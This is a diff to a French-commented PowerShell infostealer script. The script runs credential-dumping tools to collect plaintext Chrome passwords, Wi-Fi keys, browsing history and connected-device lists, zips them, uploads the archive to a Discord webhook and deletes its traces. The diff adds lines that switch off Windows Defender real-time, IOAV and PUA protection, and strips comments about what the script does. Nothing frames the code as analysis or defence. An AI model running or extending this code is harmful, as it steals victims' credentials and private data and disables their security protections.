@@ -10,6 +10,11 @@ $basePath = "C:\Users\Public\Documents\scripts"
 $dumpFolder = "$basePath\$env:USERNAME-$(get-date -f yyyy-MM-dd)"
 $dumpFile = "$dumpFolder.zip"
 
+# Neutralisation temporaire de Defender pour autoriser l'outil
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
+
 # Nettoyage absolu et forcé au démarrage
 Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 2
@@ -39,13 +44,12 @@ try {
 Stop-Process -Name "chrome", "msedge", "firefox", "brave" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 3
 
-# --- LANCEMENT VISIBLE DE CHROMEPASS POUR TEST ---
+# --- LANCEMENT VISIBLE DE CHROMENPASS ---
 Write-Host "[*] Lancement visible de chromepass.exe..." -ForegroundColor Yellow
 $outputPath = "$basePath\passwords.txt"
 "=== CREDENTIALS CHROME (EN CLAIR) ===" | Out-File -FilePath $outputPath -Encoding UTF8
 
 if (Test-Path "$basePath\chromepass.exe") {
-    # Lancement normal et visible (sans -WindowStyle Hidden ni argument pour voir si la fenêtre s'ouvre)
     Start-Process -FilePath "$basePath\chromepass.exe"
 } else {
     Add-Content -Path $outputPath -Value "[!] Outil chromepass.exe introuvable."
@@ -64,7 +68,6 @@ if (Test-Path "$basePath\WNetWatcher.exe") {
 
 Start-Sleep -Seconds 2
 
-# Vérification et sécurisation des fichiers générés
 foreach ($file in @("passwords.txt", "wifi.txt", "history.txt", "connected_devices.txt")) {
     $filePath = "$basePath\$file"
     if (!(Test-Path $filePath) -or ((Get-Item $filePath).Length -eq 0)) {
@@ -77,7 +80,6 @@ Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
 
 if (!(Test-Path $dumpFile)) { exit 1 }
 
-# Envoi du fichier ZIP sur le webhook Discord
 Write-Host "[*] Envoi sur Discord..." -ForegroundColor Yellow
 if (-not ("System.Net.Http.HttpClient" -as [type])) {
     $httpPath = Get-ChildItem -Path "C:\Windows\Microsoft.NET\Framework64\" -Recurse -Filter "System.Net.Http.dll" | Select-Object -First 1 -ExpandProperty FullName
@@ -100,7 +102,6 @@ try {
     Write-Host "[-] Erreur lors de l'envoi Discord : $_" -ForegroundColor Red
 }
 
-# Nettoyage final sécurisé
 Stop-Process -Name "chromepass", "WirelessKeyView", "BrowsingHistoryView", "WNetWatcher" -Force -ErrorAction SilentlyContinue
 Start-Sleep -Seconds 1
 Remove-Item -Recurse -Force $basePath -ErrorAction SilentlyContinue
